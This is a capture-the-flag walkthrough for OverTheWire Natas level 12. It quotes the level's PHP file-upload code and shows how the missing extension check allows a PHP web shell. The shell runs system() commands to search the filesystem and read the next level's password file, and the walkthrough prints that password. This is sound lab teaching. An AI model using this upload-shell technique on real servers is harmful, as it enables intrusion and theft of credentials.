`Link` : `https://overthewire.org/wargames/natas/natas12.html`

## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟏𝟏 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟐
## 𝐆𝐢𝐯𝐞𝐧 

- Username: natas12
- URL:      `http://natas12.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

- Visit:      `http://natas12.natas.labs.overthewire.org`
- Note that there is a file upload functionality
- `view pagesource`

```
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?> 
```

- Notice that there is no check on file extension: ` $path = $dir."/".genRandomString().".".$ext;`
- Now let's check if we can upload php shell? Make a `file.jpg` with this content:
```
<?php
	echo "php upload possible!" 
?>
```
- Intercept the request and change the file extension to php.
- Open that php file, you will see `php upload possible`
- Now, we need to find password file for `natas13`

```


<?php
	system('find / -name natas13')
?>
```
![image](https://user-images.githubusercontent.com/68887544/148888181-a3339e02-3ba4-42aa-b548-460e96fcd3c4.png)

- Let's `cat password`

```
<?php
	// #1 echo "php upload possible!" 
	// #2 system('find / -name natas13')
	// #3 exploit
	system('cat /etc/natas_webpass/natas13')
?>
```

![image](https://user-images.githubusercontent.com/68887544/148888309-6e4e07f9-3339-43bc-a17c-0542b3e29ad7.png)

- `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
